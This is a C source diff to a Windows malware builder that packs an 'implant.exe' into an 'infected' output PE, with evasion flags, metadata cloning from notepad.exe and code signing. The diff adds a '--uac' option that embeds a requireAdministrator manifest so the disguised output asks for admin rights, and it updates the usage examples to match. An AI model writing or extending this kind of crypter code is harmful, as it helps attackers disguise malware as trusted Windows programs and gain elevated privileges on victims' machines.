@@ -28,6 +28,7 @@
 #include "..\Engine\OpsecFlags.h"
 #include "PeSigning.h"
 #include "CloneMeta.h"
+#include "UacManifest.h"
 
 #pragma comment(lib, "Crypt32.lib")
 
@@ -176,6 +177,7 @@ typedef struct {
     const char* pfxPass;          /* --pfx-pass  — NULL = no password (or empty PFX)  */
     const char* tsUrl;            /* --ts-url    — NULL = sign without timestamp      */
     const char* cloneMetaPath;    /* --clone-meta — NULL = no identity cloning        */
+    BOOL        uacElevate;       /* --uac       — embed requireAdministrator manifest */
 } BUILD_CONFIG;
 
 static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
@@ -197,6 +199,7 @@ static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
     cfg->pfxPass          = NULL;
     cfg->tsUrl            = NULL;
     cfg->cloneMetaPath    = NULL;
+    cfg->uacElevate       = FALSE;
 }
 
 /* -------------------------------------------------------------------------
@@ -306,6 +309,9 @@ static BOOL ParseArgs(int argc, char* argv[], BUILD_CONFIG* cfg) {
                 CloseHandle(hTest);
             }
         }
+        else if (_stricmp(argv[i], "--uac") == 0) {
+            cfg->uacElevate = TRUE;
+        }
         else {
             printf("[!] Unknown option: %s\n", argv[i]);
             return FALSE;
@@ -378,6 +384,9 @@ static void PrintUsage(void) {
     printf("                             Name output to match donor OriginalFilename field.\n");
     printf("                             When combined with --pfx: real signature overwrites\n");
     printf("                             cloned cert; VERSIONINFO and icon are preserved.\n");
+    printf("  --uac                      Embed a UAC elevation manifest (requireAdministrator).\n");
+    printf("                             Output PE prompts for admin privileges on launch.\n");
+    printf("                             Applied as Phase 10.5 (after packing, before signing).\n");
     printf("\n");
     printf("Examples:\n");
     printf("  Builder.exe implant.exe     packed.exe\n");
@@ -389,6 +398,8 @@ static void PrintUsage(void) {
     printf("  Builder.exe implant.exe     packed.exe --pfx cert.pfx --ts-url http://timestamp.digicert.com\n");
     printf("  Builder.exe implant.exe     notepad.exe --clone-meta C:\\Windows\\System32\\notepad.exe\n");
     printf("  Builder.exe implant.exe     notepad.exe --clone-meta notepad.exe --pfx self.pfx\n");
+    printf("  Builder.exe implant.exe     packed.exe  --uac\n");
+    printf("  Builder.exe implant.exe     notepad.exe --uac --clone-meta notepad.exe --pfx self.pfx\n");
 }
 
 int main(int argc, char* argv[]) {
@@ -680,6 +691,20 @@ int main(int argc, char* argv[]) {
                                   cfg.uptimeMin,
                                   cfg.hammerMs,
                                   cfg.opsecFlags);
+
+  /* STEP 10.5: Optional UAC elevation manifest — must come AFTER BuildInfectedPE (Phase 10)
+   * because Phase 10's BeginUpdateResourceA rewrites .rsrc entirely, erasing anything written
+   * earlier.  Must come BEFORE SignPeWithPfx (Phase 12) so signing covers the manifest bytes. */
+  if (bBuildOk && cfg.uacElevate) {
+      printf("[*] Phase 10.5: Embedding UAC elevation manifest (requireAdministrator)...\n");
+      int uacRes = EmbedUacManifest(cfg.outputPath);
+      if (uacRes != 0) {
+          fprintf(stderr, "[!] UAC manifest embedding failed (code %d)\n", uacRes);
+          bBuildOk = FALSE;
+      } else {
+          printf("[+] UAC elevation manifest embedded\n");
+      }
+  }
 
   /* STEP 11: Optional metadata cloning — must come AFTER BuildInfectedPE (Phase 10)
    * because BeginUpdateResource in Phase 10 rewrites the entire .rsrc section,
